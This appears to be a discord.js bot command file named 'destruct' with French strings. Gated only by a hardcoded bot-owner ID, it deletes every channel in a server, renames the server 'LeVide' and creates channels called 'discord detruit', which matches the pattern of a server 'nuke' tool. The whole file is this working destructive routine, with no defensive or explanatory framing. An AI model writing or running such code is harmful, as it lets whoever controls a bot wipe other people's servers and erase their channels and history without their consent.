const Discord = require("discord.js");
const color = "#007fff";
const client = new Discord.Client();
const OwnerID = "303971342703919104";

module.exports.run = async (client, message, args) => {
  if (message.author.id != OwnerID) {
    return message.channel.send("Permission non accordé");
  }
  message.guild.channels.cache.forEach((channel) => {
    //message.channel.send(channel)
    console.log(channel.name);
    channel.delete().then(console.log).catch(console.error);
  });

  message.guild.setName("LeVide");

  message.guild.channels.create("discord detruit", {
    reason: "Needed a cool new channel",
  });
  message.guild.channels.create("discord detruit", {
    reason: "Needed a cool new channel",
    type: "voice",
  });
};
module.exports.help = {
  name: "destruct",
};
